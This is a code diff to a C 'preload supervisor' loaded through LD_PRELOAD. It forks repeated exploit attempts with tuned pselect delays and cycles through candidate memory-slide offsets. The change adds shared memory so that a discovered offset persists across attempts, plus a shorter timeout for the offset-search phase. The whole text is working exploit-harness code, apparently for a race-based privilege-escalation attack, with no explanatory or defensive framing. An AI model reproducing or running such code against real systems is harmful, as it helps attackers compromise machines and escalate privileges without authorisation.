@@ -3,11 +3,28 @@
 #define DEFAULT_EXPLOIT_ATTEMPTS 16
 #define DEFAULT_PSELECT_DELAY_USEC 20000
 #define DEFAULT_ATTEMPT_TIMEOUT_SEC 90
+#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 20
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
 static const uintptr_t app_slide_p0_offsets[] = {
   SLIDE_P0_OFFSET_CANDIDATES
 };
+
+struct app_p0_shared_state {
+  atomic_int ready;
+  _Atomic uintptr_t offset;
+};
+
+static struct app_p0_shared_state *app_p0_state;
+
+void app_publish_p0_offset(uintptr_t offset) {
+  if (!app_p0_state) {
+    return;
+  }
+  atomic_store(&app_p0_state->offset, offset);
+  atomic_store(&app_p0_state->ready, 1);
+}
+
 #endif
 
 static int env_int(const char *name, int fallback, int min, int max) {
@@ -54,18 +71,44 @@ __attribute__((constructor)) static void load(void) {
       "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
   int attempt_timeout_sec = env_int(
       "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 900);
+  int p0_attempt_timeout_sec = env_int(
+      "P0_ATTEMPT_TIMEOUT_SEC", DEFAULT_P0_ATTEMPT_TIMEOUT_SEC, 5,
+      attempt_timeout_sec);
+  if (p0_attempt_timeout_sec > attempt_timeout_sec) {
+    p0_attempt_timeout_sec = attempt_timeout_sec;
+  }
   if (getenv("SLIDE_ONLY")) {
     max_attempts = 1;
   }
 
+#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
+  app_p0_state = mmap(NULL, sizeof(*app_p0_state), PROT_READ | PROT_WRITE,
+                      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+  if (app_p0_state == MAP_FAILED) {
+    pr_error("app p0 shared state mmap failed errno=%d\n", errno);
+    _exit(1);
+  }
+#endif
+
   unsetenv("LD_PRELOAD");
   char *argv[] = {"preload.so", NULL};
 
-  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d timeout=%d\n",
-             getpid(), max_attempts, base_delay, attempt_timeout_sec);
+  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d "
+             "p0_timeout=%d timeout=%d\n",
+             getpid(), max_attempts, base_delay, p0_attempt_timeout_sec,
+             attempt_timeout_sec);
 
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     int delay_usec = attempt_delay_usec(base_delay, attempt);
+#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
+    uintptr_t app_attempt_offset = 0;
+    if (!getenv("SLIDE_P0_OFFSET")) {
+      size_t candidate_index =
+          (size_t)(attempt - 1) %
+          (sizeof(app_slide_p0_offsets) / sizeof(app_slide_p0_offsets[0]));
+      app_attempt_offset = app_slide_p0_offsets[candidate_index];
+    }
+#endif
     pid_t child = SYSCHK(fork());
     if (child == 0) {
       SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
@@ -77,11 +120,8 @@ __attribute__((constructor)) static void load(void) {
       SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
       if (!getenv("SLIDE_P0_OFFSET")) {
-        uintptr_t offset = app_slide_p0_offsets[
-            (size_t)(attempt - 1) %
-            (sizeof(app_slide_p0_offsets) / sizeof(app_slide_p0_offsets[0]))];
         char offset_arg[16];
-        snprintf(offset_arg, sizeof(offset_arg), "0x%zx", offset);
+        snprintf(offset_arg, sizeof(offset_arg), "0x%zx", app_attempt_offset);
         SYSCHK(setenv("SLIDE_P0_OFFSET", offset_arg, 1));
       }
       pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
@@ -110,9 +150,16 @@ __attribute__((constructor)) static void load(void) {
       struct timespec now;
       SYSCHK(clock_gettime(CLOCK_MONOTONIC, &now));
       time_t elapsed = now.tv_sec - started.tv_sec;
-      if (elapsed >= attempt_timeout_sec) {
+      int timeout_sec = attempt_timeout_sec;
+#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
+      if (!getenv("SLIDE_P0_OFFSET") &&
+          !atomic_load(&app_p0_state->ready)) {
+        timeout_sec = p0_attempt_timeout_sec;
+      }
+#endif
+      if (elapsed >= timeout_sec) {
         pr_warning("exploit attempt=%d/%d timeout pid=%d seconds=%d\n",
-                   attempt, max_attempts, child, attempt_timeout_sec);
+                   attempt, max_attempts, child, timeout_sec);
         SYSCHK(kill(child, SIGKILL));
         do {
           waited = waitpid(child, &status, 0);
@@ -129,6 +176,17 @@ __attribute__((constructor)) static void load(void) {
       pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
       return;
     }
+
+#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
+    if (!getenv("SLIDE_P0_OFFSET") &&
+        atomic_load(&app_p0_state->ready)) {
+      uintptr_t offset = atomic_load(&app_p0_state->offset);
+      char offset_arg[16];
+      snprintf(offset_arg, sizeof(offset_arg), "0x%zx", offset);
+      SYSCHK(setenv("SLIDE_P0_OFFSET", offset_arg, 1));
+      pr_success("supervisor retained discovered p0_offset=%s\n", offset_arg);
+    }
+#endif
 
     if (WIFSIGNALED(status)) {
       pr_warning("exploit attempt=%d/%d terminated signal=%d\n",
